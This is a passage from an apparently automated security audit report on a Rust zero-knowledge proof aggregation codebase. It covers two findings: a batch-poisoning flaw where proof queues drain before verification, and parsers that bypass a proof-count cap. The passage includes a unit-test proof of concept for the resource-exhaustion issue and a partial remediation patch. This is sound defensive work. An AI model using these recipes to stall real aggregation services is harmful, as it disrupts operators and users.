#### Lines 4-5 — _The target module re-exports the private-batch prover API used by the backend._

```
pub use lib::PrivateBatchProver;
pub use witness::fill_private_batch_witness;
```

### `wormhole/aggregator/src/private_batch/prover/lib.rs`
#### Lines 225-279 — _`commit` fills the recursive witness and `prove` is where aggregation proof generation occurs; no inner-proof preverification is performed before this point._

```
    /// Commit leaf proofs to the aggregation circuit witness.
    ///
    /// Performs padding with dummy proofs, shuffling, and witness filling.
    pub fn commit(mut self, mut proofs: Vec<ProofWithPublicInputs<F, C, D>>) -> Result<Self> {
        let Some(targets) = self.targets.take() else {
            bail!("private-batch aggregation prover has already committed to inputs");
        };

        if proofs.len() > self.num_leaf_proofs {
            bail!(
                "too many proofs: got {}, expected at most {}",
                proofs.len(),
                self.num_leaf_proofs
            );
        }

        // If we're going to pad with dummy proofs (asset_id = 0), ensure real proofs are asset_id=0.
        let num_dummies_needed = self.num_leaf_proofs.saturating_sub(proofs.len());
        if num_dummies_needed > 0 {
            assert_dummy_padding_asset_id_compatible(&proofs)?;
        }

        // Pad with dummy proofs
        for _ in 0..num_dummies_needed {
            proofs.push(self.dummy_proof_template.clone());
        }

        // Uniformly shuffle proofs to hide dummy positions. The circuit selects its block
        // reference from the first non-dummy slot in-circuit, so no position is special.
        if proofs.len() > 1 {
            let mut rng = rand::thread_rng();
            proofs.shuffle(&mut rng);
        }

        // Generate one dummy nullifier preimage per slot.
        // In-circuit hashes these only for dummy proofs.
        let dummy_nullifier_pre_images =
            generate_dummy_nullifier_pre_images_for_slots(proofs.len());

        fill_private_batch_witness(
            &mut self.partial_witness,
            &targets,
            &proofs,
            &dummy_nullifier_pre_images,
        )?;

        Ok(self)
    }

    /// Generate the aggregated private-batch proof after `commit(...)`.
    pub fn prove(self) -> Result<ProofWithPublicInputs<F, C, D>> {
        self.circuit_data
            .prove(self.partial_witness)
            .map_err(|e| anyhow!("Failed to prove private-batch aggregation circuit: {}", e))
    }
```

## Description

Both aggregation backends accept externally supplied proofs after checking only `public_inputs.len()`, then remove the entire queue with `take_all()` before any semantic compatibility checks, cryptographic verification, or successful proving has completed. In the private-batch path, even the partial-batch `asset_id == 0` padding rule is enforced only after the buffer has already been drained, and other same-block / same-asset / same-fee requirements are enforced later by recursive circuit constraints. In the public-batch path, the queued private-batch proofs are likewise drained before prover construction, commit, and recursive proof generation, while asset / fee / block consistency is only checked in-circuit. This means a syntactically well-formed but incompatible or invalid proof can poison a shared batch, make aggregation fail, and cause unrelated honest proofs to be discarded with no rollback. The same flaw also lets attackers force expensive commit / prove work on proofs that were never meaningfully authenticated at admission time.

## Root cause

The aggregators treat `ensure_proof_public_input_len` as sufficient admission control and destructively call `take_all()` before completing all fallible batch-compatibility checks and recursive proving steps.

## Impact

An attacker can repeatedly submit proofs with the expected shape but incompatible metadata or invalid proof bodies, causing aggregation attempts to fail only after queued honest proofs have been dropped. Operators then need to recollect or resubmit those proofs, and repeated poisoning can stall batch production and delay downstream publication or verification flows that depend on these aggregated proofs.

## Proof of concept

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc private_batch_invalid_leaf_proof_drains_queue_and_discards_honest_proof -- --nocapture
```

### Output

```
[output truncated: 46 lines & 2.2529296875 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.33s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Validation reasoning

PoC could not be executed in this environment.

---

# Batch-size inputs bypass the global proof-count cap
**#97070**
- Severity: Medium
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/common/utils.rs`
#### Lines 59-86 — _Helper derives `num_leaves` from public-input length without applying the global maximum._

```
pub fn private_batch_num_leaves_from_padded_pi_len(pi_len: usize) -> Result<usize> {
    if pi_len < aggregated_output::HEADER_LEN {
        return Err(anyhow!(
            "private-batch aggregated public input length {} is smaller than the fixed header {}",
            pi_len,
            aggregated_output::HEADER_LEN
        ));
    }

    let payload_len = pi_len - aggregated_output::HEADER_LEN;
    if !payload_len.is_multiple_of(LEAF_PI_LEN) {
        return Err(anyhow!(
            "private-batch aggregated public input length {} is malformed: expected {} + N*{}",
            pi_len,
            aggregated_output::HEADER_LEN,
            LEAF_PI_LEN
        ));
    }

    let num_leaves = payload_len / LEAF_PI_LEN;
    if num_leaves == 0 {
        return Err(anyhow!(
            "private-batch aggregated public input length {} encodes zero leaves",
            pi_len
        ));
    }

    Ok(num_leaves)
```

### `wormhole/aggregator/src/config.rs` (2 locations)
#### Lines 6-14 — _Global proof-count cap is documented as preventing excessive memory and CPU consumption._

```
/// Maximum allowed proof count to prevent excessive memory/CPU consumption.
/// This is a reasonable upper bound - aggregating more than 1024 proofs per layer
/// would result in impractically large circuits.
///
/// In practice, even ~64 proofs is near the practical limit on commodity hardware
/// (current benches test up to 49). The 1024 cap is "obviously safe" headroom.
/// Any future need to raise this limit would require a coordinated artifact
/// regeneration across all deployments.
pub const MAX_PROOF_COUNT: usize = 1024;
```

⋯
#### Lines 48-72 — _sibling validation path enforcing 1..=MAX_PROOF_COUNT that this helper bypasses_ — _Configured proof counts are bounded by `MAX_PROOF_COUNT`._

```
    pub fn validate(&self) -> Result<()> {
        if self.num_leaf_proofs == 0 {
            bail!("num_leaf_proofs must be > 0");
        }
        if self.num_leaf_proofs > MAX_PROOF_COUNT {
            bail!(
                "num_leaf_proofs ({}) exceeds maximum allowed ({})",
                self.num_leaf_proofs,
                MAX_PROOF_COUNT
            );
        }
        if let Some(n) = self.num_private_batch_proofs {
            if n == 0 {
                bail!("num_private_batch_proofs must be > 0 when specified");
            }
            if n > MAX_PROOF_COUNT {
                bail!(
                    "num_private_batch_proofs ({}) exceeds maximum allowed ({})",
                    n,
                    MAX_PROOF_COUNT
                );
            }
        }
        Ok(())
    }
```

### `wormhole/aggregator/src/public_batch/circuit/build.rs`
#### Lines 31-47 — _Public-batch builder derives `private_batch_num_leaves` from loaded private-batch common data and uses it to build the circuit._

```
    let private_batch_common = load_private_batch_common_from_bins(output_dir)
        .context("Failed to load private-batch common circuit data")?;
    let private_batch_verifier_only = load_private_batch_verifier_only_from_bins(output_dir)
        .context("Failed to load private-batch verifier data")?;

    let private_batch_num_leaves =
        private_batch_num_leaves_from_padded_pi_len(private_batch_common.num_public_inputs)?;

    // Non-ZK config: public-batch witnesses (private-batch proofs) are already public data and their
    // public inputs are forwarded verbatim, so blinding buys nothing and slows proving.
    let public_batch_circuit = PublicBatchCircuit::new(
        wormhole_public_batch_circuit_config(),
        private_batch_common,
        &private_batch_verifier_only,
        num_private_batch_proofs,
        private_batch_num_leaves,
    );
```

### `wormhole/aggregator/src/public_batch/circuit/circuit_logic.rs` (3 locations)
#### Lines 55-70 — _Public-batch circuit only asserts the derived count is nonzero and uses a debug-only shape assertion._

```
        assert!(n_inner > 0, "n_inner must be > 0");
        assert!(
            private_batch_num_leaves > 0,
            "private_batch_num_leaves must be > 0"
        );

        let expected_l0_pi_len = pbc::private_batch_pi_len(private_batch_num_leaves);

        debug_assert_eq!(
            private_batch_common.num_public_inputs,
            expected_l0_pi_len,
            "private_batch_common.num_public_inputs ({}) != expected private_batch PI len ({}) for private_batch_num_leaves={}",
            private_batch_common.num_public_inputs,
            expected_l0_pi_len,
            private_batch_num_leaves,
        );
```

⋯
#### Lines 160-164 — _Derived leaf count controls exit-slot and nullifier counts._

```
    let private_batch_pi_len = pbc::private_batch_pi_len(private_batch_num_leaves);
    let private_batch_exit_slots_per_proof =
        pbc::private_batch_exit_slots_count(private_batch_num_leaves);
    let private_batch_nullifiers_per_proof =
        pbc::private_batch_nullifiers_count(private_batch_num_leaves);
```

⋯
#### Lines 270-294 — _Circuit construction loops over derived exit-slot and nullifier regions._

```
    let exit_slots_start = pbc::private_batch_exit_slots_start();
    for (i, pis_i) in private_batch_pi_targets.iter().take(n_inner).enumerate() {
        for slot_idx in 0..private_batch_exit_slots_per_proof {
            let slot_base = exit_slots_start + slot_idx * pbc::PRIVATE_BATCH_EXIT_SLOT_LEN;
            // [sum(1), exit_account(4)]
            for j in 0..pbc::PRIVATE_BATCH_EXIT_SLOT_LEN {
                let forwarded = builder.select(is_dummy_flags[i], zero, pis_i[slot_base + j]);
                output_pis.push(forwarded);
            }
        }
    }

    // 6) Forward nullifiers from all private-batch proofs, zeroing dummy inners'
    //    nullifiers. This lets the chain skip them (no storage bloat) and lets a
    //    single dummy proof template fill several slots without collisions. Real
    //    nullifiers are hash outputs and are never zero.
    let nullifiers_start = pbc::private_batch_nullifiers_start(private_batch_num_leaves);
    for (i, pis_i) in private_batch_pi_targets.iter().take(n_inner).enumerate() {
        for n_idx in 0..private_batch_nullifiers_per_proof {
            let base = nullifiers_start + n_idx * 4;
            for j in 0..4 {
                let forwarded = builder.select(is_dummy_flags[i], zero, pis_i[base + j]);
                output_pis.push(forwarded);
            }
        }
```

### `wormhole/aggregator/src/private_batch/circuit/build.rs`
#### Lines 21-42 — _pub helper accepts num_leaf_proofs and builds circuit with no upper-bound validation_

```
pub fn generate_private_batch_circuit_binaries<P: AsRef<Path>>(
    output_dir: P,
    num_leaf_proofs: usize,
    include_prover: bool,
) -> Result<()> {
    let output_path = output_dir.as_ref();
    create_dir_all(output_path)?;

    println!(
        "Building prebuilt private-batch aggregation circuit (num_leaf_proofs={})...",
        num_leaf_proofs
    );

    let leaf_common = load_leaf_common_data(&output_path.join("common.bin"))?;
    let leaf_verifier_only = load_leaf_verifier_only_data(&output_path.join("verifier.bin"))?;

    let agg_circuit = PrivateBatchCircuit::new(
        wormhole_private_batch_circuit_config(),
        &leaf_common,
        &leaf_verifier_only,
        num_leaf_proofs,
    );
```

### `wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs` (2 locations)
#### Lines 59-66 — _PrivateBatchCircuit::new asserts only n_leaf > 0_

```
    pub fn new(
        config: CircuitConfig,
        leaf_common: &CommonCircuitData<F, D>,
        leaf_verifier_only: &VerifierOnlyCircuitData<C, D>,
        n_leaf: usize,
    ) -> Self {
        assert!(n_leaf > 0, "n_leaf must be > 0");

```

⋯
#### Lines 60-78 — _The private-batch circuit asserts nonzero and allocates per-leaf targets._

```
        config: CircuitConfig,
        leaf_common: &CommonCircuitData<F, D>,
        leaf_verifier_only: &VerifierOnlyCircuitData<C, D>,
        n_leaf: usize,
    ) -> Self {
        assert!(n_leaf > 0, "n_leaf must be > 0");

        let mut builder = CircuitBuilder::<F, D>::new(config);

        let leaf_proofs = add_recursive_verifiers::<F, C, D>(
            &mut builder,
            leaf_common,
            leaf_verifier_only,
            n_leaf,
        );

        // Allocate one dummy-nullifier preimage target (4 felts) per slot.
        let mut dummy_nullifier_pre_images = Vec::with_capacity(n_leaf);
        for _ in 0..n_leaf {
```

### `wormhole/circuit/src/lib.rs`
#### Lines 5-13 — _Publicly exports the `inputs` parser module._

```
pub mod block_header;
pub mod circuit;
pub mod inputs;
pub mod nullifier;
#[cfg(feature = "profile")]
pub mod profile;
pub mod substrate_account;
pub mod unspendable_account;
pub mod zk_merkle_proof; // 4-ary Poseidon Merkle proof
```

### `wormhole/circuit/src/inputs.rs` (2 locations)
#### Lines 161-183 — _Parser derives `n_leaf` from caller-controlled length with no upper bound._

```
impl ParsePrivateBatchPublicInputs for PrivateBatchPublicInputs {
    fn try_from_felts(pis: &[GoldilocksField]) -> anyhow::Result<PrivateBatchPublicInputs> {
        // Layout: [num_unique_exits, asset_id, volume_fee_bps, block_hash(4), block_number,
        //          [output_sum(1), exit_account(4)] * 2*N, nullifiers(4) * N, padding...]

        // Validate layout: total length must be 8 + N * PUBLIC_INPUTS_FELTS_LEN
        let payload_len = pis
            .len()
            .checked_sub(8)
            .filter(|len| len % PUBLIC_INPUTS_FELTS_LEN == 0)
            .ok_or_else(|| {
                anyhow::anyhow!(
                    "AggregatedPI: malformed length {} - expected 8 + N*{} felts",
                    pis.len(),
                    PUBLIC_INPUTS_FELTS_LEN
                )
            })?;

        let n_leaf = payload_len / PUBLIC_INPUTS_FELTS_LEN;
        // This invariant is enforced because an aggregator should never legitimately
        // produce a PI vector with zero leaf proofs. See audit finding M-3: "Public-batch
        // has no dummy bypass; all-dummy private-batch batches break aggregation".
        anyhow::ensure!(n_leaf > 0, "AggregatedPI: need at least one leaf proof");
```

⋯
#### Lines 204-226 — _Parser allocates and fills vectors proportional to the unbounded derived batch size._

```
        // Parse 2*N exit accounts (after header at index 8)
        let account_data = pis[8..]
            .chunks(5)
            .take(n_leaf * 2)
            .enumerate()
            .map(|(i, chunk)| {
                Ok(PublicInputsByAccount {
                    summed_output_amount: read_u32(chunk[0])
                        .with_context(|| format!("account[{}].amount", i))?,
                    exit_account: read_digest(&chunk[1..5])
                        .with_context(|| format!("account[{}].address", i))?,
                })
            })
            .collect::<anyhow::Result<Vec<_>>>()?;

        // Parse N nullifiers (after exit accounts)
        let nullifier_start = 8 + n_leaf * 2 * 5;
        let nullifiers = pis[nullifier_start..]
            .chunks(4)
            .take(n_leaf)
            .enumerate()
            .map(|(i, chunk)| read_digest(chunk).with_context(|| format!("nullifier[{}]", i)))
            .collect::<anyhow::Result<Vec<_>>>()?;
```

### `wormhole/memprof/src/main.rs` (3 locations)
#### Lines 34-43 — _Proof-count CLI fields are raw `usize` values._

```
    /// Number of leaf proofs the aggregation circuit is built for. Matches
    /// the on-chain verifier's expected batch size.
    #[arg(long, default_value_t = 7)]
    num_leaf_proofs: usize,

    /// How many real leaf proofs to actually generate before aggregation.
    /// Must be <= num_leaf_proofs. The aggregator pads the rest with dummy
    /// proofs.
    #[arg(long)]
    real_proofs: Option<usize>,
```

⋯
#### Lines 107-115 — _Only `real_proofs <= num_leaf_proofs` is enforced._

```
    let num_leaf_proofs = args.num_leaf_proofs;
    let real_proofs = args.real_proofs.unwrap_or(num_leaf_proofs);
    if real_proofs > num_leaf_proofs {
        anyhow::bail!(
            "--real-proofs ({}) must be <= --num-leaf-proofs ({})",
            real_proofs,
            num_leaf_proofs
        );
    }
```

⋯
#### Lines 130-150 — _The accepted counts drive vector allocation and aggregation construction._

```
    let mut leaf_proofs = Vec::with_capacity(real_proofs);
    if args.skip_leaf_gen {
        eprintln!(
            "Skipping leaf-proof generation; cloning dummy proof {} times",
            real_proofs
        );
        for _ in 0..real_proofs {
            leaf_proofs.push(leaf_ctx.dummy_proof.clone());
        }
    } else {
        for i in 0..real_proofs {
            let p =
                workload::generate_leaf_proof(&leaf_ctx, i, args.release_after_each, &mut report)?;
            leaf_proofs.push(p);
        }
    }

    let _agg = workload::aggregate_fresh(
        &leaf_ctx,
        leaf_proofs,
        num_leaf_proofs,
```

### `wormhole/memprof/src/workload.rs`
#### Lines 96-111 — _`num_leaf_proofs` is forwarded into `PrivateBatchProver::new`._

```
pub fn aggregate_fresh(
    leaf: &LeafContext,
    leaf_proofs: Vec<ProofWithPublicInputs<F, C, D>>,
    num_leaf_proofs: usize,
    agg_config: CircuitConfig,
    release_after: bool,
    report: &mut PhaseReport,
) -> Result<ProofWithPublicInputs<F, C, D>> {
    report.phase_start("build_agg_circuit")?;
    let prover = PrivateBatchProver::new(
        agg_config,
        leaf.common.clone(),
        &leaf.verifier_only,
        num_leaf_proofs,
        leaf.dummy_proof.clone(),
    );
```

### `wormhole/verifier/src/lib.rs`
#### Lines 78-88 — _Public verifier helper forwards caller-controlled public-batch dimensions without validation._

```
pub fn parse_public_batch_public_inputs(
    proof: &ProofWithPublicInputs<F, C, D>,
    num_private_batch_proofs: usize,
    num_leaf_proofs: usize,
) -> anyhow::Result<PublicBatchPublicInputs> {
    let u64s: Vec<u64> = proof
        .public_inputs
        .iter()
        .map(|f| f.to_canonical_u64())
        .collect();
    PublicBatchPublicInputs::try_from_u64_slice(&u64s, num_private_batch_proofs, num_leaf_proofs)
```

### `wormhole/inputs/src/lib.rs` (3 locations)
#### Lines 242-263 — _Public-batch layout length is computed with unchecked products of the supplied dimensions._

```
/// Public-batch PI layout constants (mirrors `public_batch/circuit/constants.rs`).
pub mod public_batch_pi {
    pub const AGGREGATOR_ADDRESS_LEN: usize = 4;
    pub const HEADER_LEN: usize = 12; // 4 + 1 + 1 + 4 + 1 + 1
    pub const EXIT_SLOT_LEN: usize = 5; // sum(1) + exit_account(4)

    #[inline]
    pub const fn exit_slots_per_inner(num_leaf_proofs: usize) -> usize {
        num_leaf_proofs * 2
    }

    #[inline]
    pub const fn nullifiers_per_inner(num_leaf_proofs: usize) -> usize {
        num_leaf_proofs
    }

    #[inline]
    pub const fn pi_len(num_private_batch_proofs: usize, num_leaf_proofs: usize) -> usize {
        HEADER_LEN
            + num_private_batch_proofs * exit_slots_per_inner(num_leaf_proofs) * EXIT_SLOT_LEN
            + num_private_batch_proofs * nullifiers_per_inner(num_leaf_proofs) * 4
    }
```

⋯
#### Lines 503-520 — _Parser only rejects zero dimensions, then derives expected length and slot counts from unchecked arithmetic._

```
        if num_private_batch_proofs == 0 || num_leaf_proofs == 0 {
            bail!("PublicBatchPI: num_private_batch_proofs and num_leaf_proofs must be > 0");
        }

        let expected_len = pi_len(num_private_batch_proofs, num_leaf_proofs);
        if pis.len() != expected_len {
            bail!(
                "PublicBatchPI: expected {} felts (n_inner={}, n_leaves={}), got {}",
                expected_len,
                num_private_batch_proofs,
                num_leaf_proofs,
                pis.len()
            );
        }

        let slots_per_inner = exit_slots_per_inner(num_leaf_proofs);
        let nulls_per_inner = nullifiers_per_inner(num_leaf_proofs);
        let total_exit_slots_expected = (num_private_batch_proofs * slots_per_inner) as u32;
```

⋯
#### Lines 554-579 — _Parser allocates account and nullifier vectors using products derived from the unbounded dimensions._

```
        let mut cursor = HEADER_LEN;
        let total_slots = num_private_batch_proofs * slots_per_inner;
        let mut account_data = Vec::with_capacity(total_slots);
        for i in 0..total_slots {
            let summed_output_amount: u32 = pis[cursor]
                .try_into()
                .with_context(|| format!("PublicBatchPI: exit slot {} sum exceeds u32", i))?;
            cursor += 1;

            let exit_account = hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4])
                .with_context(|| format!("PublicBatchPI: parsing exit slot {} account", i))?;
            cursor += 4;

            account_data.push(PublicInputsByAccount {
                summed_output_amount,
                exit_account,
            });
        }

        let total_nullifiers = num_private_batch_proofs * nulls_per_inner;
        let mut nullifiers = Vec::with_capacity(total_nullifiers);
        for i in 0..total_nullifiers {
            let n = hash_u64s_to_bytes_digest(&pis[cursor..cursor + 4])
                .with_context(|| format!("PublicBatchPI: parsing nullifier {}", i))?;
            cursor += 4;
            nullifiers.push(n);
```

## Description

Several public helpers and parsers accept or reconstruct aggregation batch sizes without reapplying the repository’s hard `MAX_PROOF_COUNT` invariant before doing work. In the build/profiling paths, `generate_private_batch_circuit_binaries`, `wormhole-memprof`, and standalone public-batch generation either take raw proof counts or derive `private_batch_num_leaves` from artifact/public-input length, then feed those values into circuit construction that only checks `> 0` and sizes loops and targets from them. In the parsing paths, `PrivateBatchPublicInputs::try_from_felts` derives `n_leaf` solely from slice length, while `parse_public_batch_public_inputs` forwards caller-supplied dimensions into layout code that multiplies them unchecked and allocates vectors from the results. The shared pattern is that arithmetic shape validation is treated as sufficient, even though the codebase already documents `MAX_PROOF_COUNT` as the safety boundary for memory and CPU consumption. Applying a single shared `1..=MAX_PROOF_COUNT` validation to every externally supplied or length-derived batch dimension before any arithmetic, allocation, or circuit construction would address all of these sites.

## Root cause

Multiple public build and parsing entrypoints trust externally supplied or length-derived batch dimensions without revalidating them against `MAX_PROOF_COUNT` before allocation, arithmetic, or circuit construction.

## Impact

Depending on which API is exposed, a malformed artifact, oversized CLI or library argument, or oversized proof public-input payload can trigger excessive allocation, long-running circuit construction, capacity overflow, or process aborts during parsing. This can break artifact generation, CI or profiling jobs, and verifier or proof-ingestion services that process untrusted or user-supplied batch dimensions, even though it does not directly affect on-chain state or user funds.

## Proof of concept

### Test case

```
use plonky2::field::goldilocks_field::GoldilocksField;
use plonky2::field::types::Field;
use qp_wormhole_inputs::{public_batch_pi, PrivateBatchPublicInputs, PublicBatchPublicInputs, PUBLIC_INPUTS_FELTS_LEN};
use wormhole_aggregator::{CircuitBinsConfig, MAX_PROOF_COUNT};
use wormhole_circuit::inputs::ParsePrivateBatchPublicInputs;

#[test]
fn oversized_private_batch_field_parser_bypasses_global_max_cap() {
    let oversized = MAX_PROOF_COUNT + 1;

    assert!(
        CircuitBinsConfig::new(oversized, Some(1)).is_err(),
        "validated config path must reject batch sizes above MAX_PROOF_COUNT"
    );

    let pis = vec![GoldilocksField::ZERO; 8 + oversized * PUBLIC_INPUTS_FELTS_LEN];
    let parsed = <PrivateBatchPublicInputs as ParsePrivateBatchPublicInputs>::try_from_felts(&pis)
        .expect("shape-valid oversized field slice is still accepted by the public parser");

    assert!(
        parsed.account_data.len() > MAX_PROOF_COUNT,
        "accepted parser output should contain more exit slots than the documented global cap"
    );
    assert!(
        parsed.nullifiers.len() > MAX_PROOF_COUNT,
        "accepted parser output should contain more nullifiers than the documented global cap"
    );
    assert_eq!(parsed.account_data.len(), parsed.nullifiers.len() * 2);
}

#[test]
fn oversized_public_batch_u64_parser_bypasses_global_max_cap() {
    let oversized = MAX_PROOF_COUNT + 1;

    assert!(
        CircuitBinsConfig::new(1, Some(oversized)).is_err(),
        "validated config path must reject oversized public-batch dimensions"
    );

    let expected_len = public_batch_pi::pi_len(oversized, 1);
    let mut pis = vec![0u64; expected_len];
    pis[11] = (public_batch_pi::exit_slots_per_inner(1) * oversized) as u64;

    let parsed = PublicBatchPublicInputs::try_from_u64_slice(&pis, oversized, 1)
        .expect("shape-valid oversized public-batch layout is still accepted");

    assert!(
        parsed.account_data.len() > MAX_PROOF_COUNT,
        "accepted parser output should allocate more exit slots than the documented global cap"
    );
    assert!(
        parsed.nullifiers.len() > MAX_PROOF_COUNT,
        "accepted parser output should allocate more nullifiers than the documented global cap"
    );
    assert_eq!(parsed.total_exit_slots as usize, parsed.account_data.len());
}
```

### Setup script

```
#!/bin/bash
set -e

# Standalone PoC reproduction. Run from the repository root of a checkout at
# the audited commit, with the language toolchain installed.

# Place the downloaded PoC files at these paths before running:
#   wormhole/tests/tests/poc.rs

# install dependencies
cargo +'1.93.0' fetch --locked --manifest-path 'Cargo.toml'

# build and run
cargo build --tests --workspace
cargo test -p tests --test poc
```

### Output

```
[output truncated: 28 lines & 0.9140625 KB skipped]


</test-stdout>

<test-stderr>
   Compiling tests v3.0.0 (/repo/wormhole/tests)
    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.50s
     Running tests/poc.rs (target/debug/deps/poc-76feceaa046eb0ff)

</test-stderr>
```

### Considerations

PoC compiled and passed via `cargo test -p tests --test poc` using `unit:wormhole-tests-tests-poc-rs`. It demonstrates two real public entry points accepting `MAX_PROOF_COUNT + 1` despite `CircuitBinsConfig::new` rejecting the same dimensions: `wormhole_circuit::inputs::ParsePrivateBatchPublicInputs::try_from_felts` and `qp_wormhole_inputs::PublicBatchPublicInputs::try_from_u64_slice`. The test proves the invariant bypass and resulting oversized vector construction/accounting, but it does not drive the separate builder/memprof circuit-construction paths to an actual OOM/abort because doing so would require intentionally extreme allocations beyond a safe unit-test harness.

### Validation reasoning

PoC validation command completed successfully.

## Remediation

### Explanation

Introduced a shared MAX_PROOF_COUNT validator in qp-wormhole-inputs, re-exported it through the aggregator for memprof, and applied it before any batch-size-derived arithmetic, allocation, parser reconstruction, or circuit artifact construction in the affected private/public batch entry points.

### Patch

```diff
diff --git a/wormhole/inputs/src/lib.rs b/wormhole/inputs/src/lib.rs
--- a/wormhole/inputs/src/lib.rs
+++ b/wormhole/inputs/src/lib.rs
@@ -1,621 +1,667 @@
 //! Public input types for Wormhole circuit proofs.
 //!
 //! This crate provides the data structures needed to parse and represent
 //! public inputs from Wormhole ZK proofs. It is designed to be lightweight
 //! and have minimal dependencies, making it suitable for use in both
 //! prover and verifier contexts.
 
 #![cfg_attr(not(feature = "std"), no_std)]
 
 extern crate alloc;
 
 use alloc::fmt;
 use alloc::format;
 use alloc::vec::Vec;
 use anyhow::{bail, Context};
 use core::ops::Deref;
 
+/// Maximum allowed proof count to prevent excessive memory/CPU consumption.
+/// This bound is shared across batch builders and parsers so untrusted batch
+/// dimensions are rejected before arithmetic or allocation.
+pub const MAX_PROOF_COUNT: usize = 1024;
+
 /// Number of bytes in a digest (32 bytes = 256 bits)
 pub const DIGEST_BYTES_LEN: usize = 32;
 
 /// Goldilocks field order (2^64 - 2^32 + 1)
 /// Used to validate that bytes can be represented as field elements
 const GOLDILOCKS_ORDER: u64 = 0xFFFFFFFF00000001;
 
 /// The total size of the public inputs field element vector.
 /// Layout: asset_id(1) + output_amount_1(1) + output_amount_2(1) + volume_fee_bps(1) +
 ///         nullifier(4) + exit_account_1(4) + exit_account_2(4) + block_hash(4) + block_number(1)
 /// = 1 + 1 + 1 + 1 + 4 + 4 + 4 + 4 + 1 = 21
 ///
 /// Note: exit accounts use 4 felts (8 bytes/felt) for hash-derived accounts.
 /// parent_hash is a private input to the leaf circuit (used to compute block_hash)
 /// but is not exposed as a public input since block_hash already commits to it.
 pub const PUBLIC_INPUTS_FELTS_LEN: usize = 21;
 
 // Index constants for parsing public inputs
 pub const ASSET_ID_INDEX: usize = 0;
 pub const OUTPUT_AMOUNT_1_INDEX: usize = 1;
 pub const OUTPUT_AMOUNT_2_INDEX: usize = 2;
 pub const VOLUME_FEE_BPS_INDEX: usize = 3;
 pub const NULLIFIER_START_INDEX: usize = 4;
 pub const NULLIFIER_END_INDEX: usize = 8;
 pub const EXIT_ACCOUNT_1_START_INDEX: usize = 8;
 pub const EXIT_ACCOUNT_1_END_INDEX: usize = 12;
 pub const EXIT_ACCOUNT_2_START_INDEX: usize = 12;
 pub const EXIT_ACCOUNT_2_END_INDEX: usize = 16;
 pub const BLOCK_HASH_START_INDEX: usize = 16;
 pub const BLOCK_HASH_END_INDEX: usize = 20;
 pub const BLOCK_NUMBER_INDEX: usize = 20;
 
+#[inline]
+pub fn ensure_proof_count(count: usize, label: &str) -> anyhow::Result<usize> {
+    if count == 0 {
+        bail!("{label} must be > 0");
+    }
+    if count > MAX_PROOF_COUNT {
+        bail!(
+            "{label} ({}) exceeds maximum allowed ({})",
+            count,
+            MAX_PROOF_COUNT
+        );
+    }
+    Ok(count)
+}
+
+#[inline]
+pub fn ensure_public_batch_dimensions(
+    num_private_batch_proofs: usize,
+    num_leaf_proofs: usize,
+) -> anyhow::Result<(usize, usize)> {
+    Ok((
+        ensure_proof_count(num_private_batch_proofs, "num_private_batch_proofs")?,
+        ensure_proof_count(num_leaf_proofs, "num_leaf_proofs")?,
+    ))
+}
+
 /// A 32-byte digest that can be converted to/from field elements.
 #[derive(Hash, Default, Clone, Copy, PartialEq, Eq, Ord, PartialOrd)]
 pub struct BytesDigest([u8; DIGEST_BYTES_LEN]);
 
 impl BytesDigest {
     /// Create a BytesDigest without validation.
     ///
     /// Use this for the 4-bytes-per-felt encoding where each chunk is a u32
     /// and doesn't need to fit in an 8-byte field element constraint.
     pub const fn new_unchecked(bytes: [u8; DIGEST_BYTES_LEN]) -> Self {
         BytesDigest(bytes)
     }
 }
 
 impl fmt::Debug for BytesDigest {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         write!(f, "BytesDigest(0x")?;
         for byte in &self.0 {
             write!(f, "{:02x}", byte)?;
         }
         write!(f, ")")
     }
 }
 
 /// Errors that can occur when working with digests
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum DigestError {
     /// A chunk of bytes exceeds the field order
     ChunkOutOfFieldRange { chunk_index: usize, value: u64 },
     /// The input has an invalid length
     InvalidLength { expected: usize, got: usize },
 }
 
 impl fmt::Display for DigestError {
     fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         match self {
             DigestError::ChunkOutOfFieldRange { chunk_index, value } => {
                 write!(
                     f,
                     "Chunk out of field range at index {}: {}",
                     chunk_index, value
                 )
             }
             DigestError::InvalidLength { expected, got } => {
                 write!(f, "Invalid length: expected {}, got {}", expected, got)
             }
         }
     }
 }
 
 #[cfg(feature = "std")]
 impl std::error::Error for DigestError {}
 
 impl TryFrom<&[u8]> for BytesDigest {
     type Error = DigestError;
 
     fn try_from(value: &[u8]) -> Result<Self, Self::Error> {
         let bytes: [u8; DIGEST_BYTES_LEN] =
             value.try_into().map_err(|_| DigestError::InvalidLength {
                 expected: DIGEST_BYTES_LEN,
                 got: value.len(),
             })?;
         BytesDigest::try_from(bytes)
     }
 }
 
 impl TryFrom<[u8; DIGEST_BYTES_LEN]> for BytesDigest {
     type Error = DigestError;
 
     fn try_from(value: [u8; DIGEST_BYTES_LEN]) -> Result<Self, Self::Error> {
         // Validate that each 8-byte chunk fits in the Goldilocks field
         for (i, chunk) in value.chunks(8).enumerate() {
             let v =
                 u64::from_le_bytes(chunk.try_into().map_err(|_| DigestError::InvalidLength {
                     expected: 8,
                     got: chunk.len(),
                 })?);
             if v >= GOLDILOCKS_ORDER {
                 return Err(DigestError::ChunkOutOfFieldRange {
                     chunk_index: i,
                     value: v,
                 });
             }
         }
         Ok(BytesDigest(value))
     }
 }
 
 impl Deref for BytesDigest {
     type Target = [u8; DIGEST_BYTES_LEN];
 
     fn deref(&self) -> &Self::Target {
         &self.0
     }
 }
 
 impl AsRef<[u8]> for BytesDigest {
     fn as_ref(&self) -> &[u8] {
         &self.0
     }
 }
 
 /// All of the public inputs required for a single wormhole proof.
